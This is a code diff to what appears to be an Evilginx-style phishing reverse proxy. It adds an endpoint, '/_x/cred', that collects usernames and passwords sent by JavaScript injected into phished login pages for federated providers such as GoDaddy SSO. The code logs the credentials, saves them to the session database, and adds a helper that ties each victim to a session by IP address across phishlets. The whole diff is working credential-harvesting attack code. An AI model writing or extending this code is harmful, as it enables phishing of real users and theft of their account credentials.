@@ -309,6 +309,35 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				}
 			}
 
+			// /_x/cred — JS-injected credential capture for federated providers (GoDaddy SSO, etc.)
+			// The injected script POSTs the password here so we don't depend on session cookie.
+			if req.Method == "POST" && req.URL.Path == "/_x/cred" {
+				if body, err := ioutil.ReadAll(req.Body); err == nil {
+					var credData struct {
+						P string `json:"p"`
+						U string `json:"u"`
+					}
+					if json.Unmarshal(body, &credData) == nil && credData.P != "" {
+						if sid, ok := p.getSessionIdByIPAny(remote_addr); ok {
+							if credData.U != "" {
+								p.setSessionUsername(sid, credData.U)
+								log.Success("[js-cred] Username: [%s]", credData.U)
+								if s, ok2 := p.sessions[sid]; ok2 {
+									_ = p.db.SetSessionUsername(sid, credData.U)
+									_ = s
+								}
+							}
+							p.setSessionPassword(sid, credData.P)
+							log.Success("[js-cred] Password: [%s]", credData.P)
+							_ = p.db.SetSessionPassword(sid, credData.P)
+						} else {
+							log.Warning("[js-cred] password arrived but no session found for IP: %s", remote_addr)
+						}
+					}
+				}
+				return req, goproxy.NewResponse(req, "application/json", 200, "{}")
+			}
+
 			phishDomain, phished := p.getPhishDomain(req.Host)
 			if phished {
 				pl_name := ""
@@ -1955,6 +1984,23 @@ func (p *HttpProxy) getSessionIdByIP(ip_addr string, hostname string) (string, b
 	if pl != nil {
 		sid, ok := p.ip_sids[ip_addr+"-"+pl.Name]
 		return sid, ok
+	}
+	return "", false
+}
+
+// getSessionIdByIPAny finds a session for this IP across all enabled phishlets.
+// Used by the /_x/cred JS-injected credential capture path where we have no
+// session cookie and no phishlet-specific hostname to key off.
+func (p *HttpProxy) getSessionIdByIPAny(ip_addr string) (string, bool) {
+	p.ip_mtx.Lock()
+	defer p.ip_mtx.Unlock()
+
+	for site, pl := range p.cfg.phishlets {
+		if p.cfg.IsSiteEnabled(site) {
+			if sid, ok := p.ip_sids[ip_addr+"-"+pl.Name]; ok {
+				return sid, true
+			}
+		}
 	}
 	return "", false
 }
